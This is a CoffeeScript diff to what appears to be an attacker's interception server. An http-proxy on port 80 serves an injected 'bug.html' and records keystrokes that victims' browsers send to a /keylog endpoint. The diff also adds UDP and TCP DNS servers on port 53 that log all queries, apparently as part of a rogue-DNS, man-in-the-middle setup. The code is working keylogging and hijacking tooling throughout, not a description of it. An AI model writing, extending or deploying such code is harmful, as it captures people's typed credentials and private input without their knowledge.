@@ -1,13 +1,14 @@
 
 httpProxy = require 'http-proxy'
 fs = require 'fs'
+dns = require 'native-dns'
 
 bug = fs.readFileSync 'bug.html'
 
 server = httpProxy.createServer (req, res, proxy) ->
   if /^\/keylog/.exec(req.url)
     key = /key=(.)/.exec(req.url)?[1]
-    console.log "key: #{key}"
+    process.stdout.write key
     res.writeHead(200)
     res.end('ok')
 
@@ -34,4 +35,20 @@ server = httpProxy.createServer (req, res, proxy) ->
     port: 80
 
 server.listen 80
+
+handleRequest = (req, res) ->
+  console.log req
+
+handleError = (error) ->
+  console.log error
+
+dnsServer = dns.createServer()
+dnsServer.on 'request', handleRequest
+dnsServer.on 'error', handleError
+dnsServer.serve 53
+  
+tcpDnsServer = dns.createTCPServer()
+tcpDnsServer.on 'request', handleRequest
+tcpDnsServer.on 'error', handleError
+tcpDnsServer.serve 53
 
